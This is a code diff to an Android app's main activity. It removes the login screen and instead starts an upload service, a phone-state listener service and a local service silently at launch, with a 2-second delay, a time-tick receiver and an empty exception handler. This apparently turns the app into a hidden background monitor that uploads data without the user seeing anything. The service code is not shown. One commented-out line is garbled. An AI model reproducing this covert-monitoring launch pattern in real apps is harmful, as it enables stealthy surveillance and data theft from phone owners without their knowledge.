@@ -2,6 +2,7 @@ package com.qiezh.ucon;
 
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.support.constraint.ConstraintLayout;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
@@ -20,10 +21,23 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        try{
+            Thread.sleep(2000);
+            MyUploadService.InitUploadService();
+            registerPhoneStateListener();
+            startLocalService();
+
+            IntentFilter filter = new IntentFilter(Intent.ACTION_TIME_TICK);
+            MyBroadcastReceiver receiver = new MyBroadcastReceiver();
+            registerReceiver(receiver, filter);
+        }catch (Exception e ){
+
+        }
+        /*
         setContentView(R.layout.activity_main);
         Button button = findViewById(R.id.login_button);
-        emailText = findViewById(R.id.email_text);
-        pwdText = findViewById(R.id.pwd_text);
+        emailText = findViewById(R.id.email_text);/pwdText = findViewById(R.id.pwd_text);
         button.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -33,8 +47,10 @@ public class MainActivity extends AppCompatActivity {
                 MyUploadService.InitUploadService();
                 registerPhoneStateListener();
                 startLocalService();
+
+                moveTaskToBack(true);
             }
-        });
+        });*/
     }
     private void registerPhoneStateListener() {
         Intent intent = new Intent(this, PhoneListenService.class);
